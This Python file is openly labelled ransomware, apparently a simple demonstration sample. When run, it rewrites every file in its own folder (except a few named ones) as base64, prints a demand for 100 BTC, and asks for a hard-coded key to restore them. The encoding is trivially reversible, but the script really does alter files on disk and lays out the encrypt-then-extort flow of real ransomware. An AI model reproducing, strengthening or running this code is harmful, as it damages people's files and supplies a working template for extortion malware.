import logging
import os
import sys
import base64


class Ransomware:
    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def key(self):
        return "__ransomware_key"

    def key_obtained(self):
        return input("Please enter a key: ")

    def ransom_user(self):
        print(
            "Hi, all your files has been encrypted. Please "
            "send 100 BTC on this address to get decryption"
            " key: XYZ."
        )

    def encrypt_file(self, filename):

        with open(filename, 'r') as file:
            content = file.read()
        encrypted_data = base64.b64encode(content.encode('utf-8'))
        with open(filename, 'w') as file:
            file.write(encrypted_data.decode('utf-8'))

    def decrypt_file(self, key, filename):
        with open(filename, 'r') as file:
            content = file.read()
        decrypted_data = base64.b64decode(content)
        with open(filename, 'wb') as file:
            file.write(decrypted_data)

    def get_files_in_folder(self, path):
        files = []
        for file in os.listdir(path):
            if file == 'README.md' or file == 'ransomware.py' or file == 'ransomware2.py' or file == sys.argv[0]:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files

    def encrypt_files_in_folder(self, path):
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)
        for file in files:
            logging.debug('Encrypting file: {}'.format(file))
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        if (key := self.key_obtained()) != self.key:
            print('Wrong key!')
            return

        files = self.get_files_in_folder(path)
        for file in files:
            self.decrypt_file(key, file)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    ransomware = Ransomware('WEBKINGRANSOMWARE')
    path = os.path.dirname(os.path.abspath(__file__))
    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))
    ransomware.decrypt_files_in_folder(path)
